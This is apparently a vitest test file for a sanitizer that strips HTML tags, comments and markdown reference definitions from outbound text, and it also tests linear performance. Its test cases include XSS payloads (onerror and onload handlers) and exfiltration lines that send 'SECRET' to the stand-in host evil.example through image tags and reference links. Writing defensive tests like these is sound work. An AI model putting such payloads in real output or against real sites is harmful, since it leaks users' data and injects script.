import { describe, expect, it } from 'vitest';
import { sanitizeOutboundText } from './sanitize';

const ZWSP = '​';

/** No tag, comment or declaration can open in the output. */
function expectNoTagOpener(out: string) {
  expect(out).not.toMatch(/<[a-z/!?]/i);
}

function timed(input: string) {
  const start = performance.now();
  const out = sanitizeOutboundText(input);
  return { out, ms: performance.now() - start };
}

describe('sanitizeOutboundText HTML handling', () => {
  it('leaves no tag behind for nested and overlapping tags', () => {
    const cases = [
      '<scr<script>ipt>alert(1)</script>',
      '<<script>script>alert(1)<</script>/script>',
      '<img src=x onerror=alert(1)//',
      '<<img src=x>img src="https://evil.example/?d=SECRET">',
      '<!-- <img src="https://evil.example/?d=SECRET"> -->',
      '</ img>',
      '<a href="https://evil.example">x</a>',
      '<svg><svg/onload=alert(1)>',
    ];
    for (const input of cases) {
      const out = sanitizeOutboundText(input);
      expectNoTagOpener(out);
      expect(out).not.toContain('https://evil.example/?d=SECRET">');
      // Sanitizing again changes nothing: the output holds no tag.
      expect(sanitizeOutboundText(out)).toBe(out);
    }
    expect(sanitizeOutboundText('<scr<script>ipt>x')).toBe('ipt>x');
    expect(sanitizeOutboundText('<<script>script>')).toBe('');
    // Nesting deeper than the bounded passes is broken instead of stripped.
    const deep = '<'.repeat(6) + 'a>'.repeat(6);
    const out = sanitizeOutboundText(deep);
    expectNoTagOpener(out);
    expect(out).toContain(`<${ZWSP}`);
  });

  it('keeps ordinary comparisons and mentions intact', () => {
    expect(sanitizeOutboundText('1 < 2 and 3 > 2')).toBe('1 < 2 and 3 > 2');
    expect(sanitizeOutboundText('<@123>')).toBe(`<@${ZWSP}123>`);
  });
});

describe('sanitizeOutboundText reference definitions', () => {
  it('drops definitions, including blockquoted and next-line destinations', () => {
    expect(
      sanitizeOutboundText('a\n[r]: https://evil.example/?d=SECRET\nb')
    ).toBe('a\n\nb');
    expect(
      sanitizeOutboundText('> [r]: https://evil.example/?d=SECRET')
    ).not.toContain('SECRET');
    expect(
      sanitizeOutboundText('[x]:\n> https://evil.example/?d=SECRET\nkeep')
    ).toBe('\nkeep');
    expect(sanitizeOutboundText('[not a definition] here')).toBe(
      '[not a definition] here'
    );
    expect(sanitizeOutboundText('[]: empty label')).toBe('[]: empty label');
  });
});

describe('sanitizeOutboundText is linear on adversarial input', () => {
  const n = 200_000;
  const adversarial = {
    'unclosed tags': '<a'.repeat(n),
    'nested openers': '<'.repeat(n) + 'a',
    'tag soup': '<a <b <c '.repeat(n / 3),
    'blockquote run': `${'>'.repeat(n)}[`,
    'definition-like lines': '[x] :\n'.repeat(n / 6),
    'many definitions': '[x]:\n'.repeat(n / 5),
    'unclosed image alts': '!['.repeat(n),
    'unclosed image destinations': '![a]('.repeat(n / 5),
    'reference image runs': '![a]['.repeat(n / 5),
  };

  for (const [name, input] of Object.entries(adversarial)) {
    it(`handles ${name} quickly`, () => {
      const { out, ms } = timed(input);
      expect(ms).toBeLessThan(1_000);
      expectNoTagOpener(out);
    });
  }

  it('scales linearly rather than quadratically', () => {
    const small = timed('<a'.repeat(50_000) + '!['.repeat(50_000)).ms;
    const large = timed('<a'.repeat(400_000) + '!['.repeat(400_000)).ms;
    // Eight times the input; a quadratic scan would take about 64 times as long.
    expect(large).toBeLessThan(Math.max(small, 5) * 24);
  });
});
